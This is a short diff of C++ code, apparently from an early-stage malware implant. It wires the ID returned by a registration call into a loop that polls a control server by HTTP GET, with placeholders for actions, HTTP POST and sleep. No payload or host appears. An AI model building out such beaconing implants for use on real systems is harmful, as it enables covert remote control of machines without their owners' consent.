@@ -38,16 +38,16 @@
 
 int temp_loop() {
     //note - do a while not registered?
-    register_implant(); // should return id or set it in settings, etc. 
+    std::string implant_uuid = register_implant(); // should return id or set it in settings, etc. 
 
     while (1) {
         //HTTP_GET
         //placeholder id
-        get("019bbe19-2c0e-7ee1-a81a-78d7e1a97ac0");
+        get(implant_uuid);
 
         //ACTIONS
 
-        //HTTP_POST
+        //HTTP_POST < next
 
         //SLEEP
         return 0;
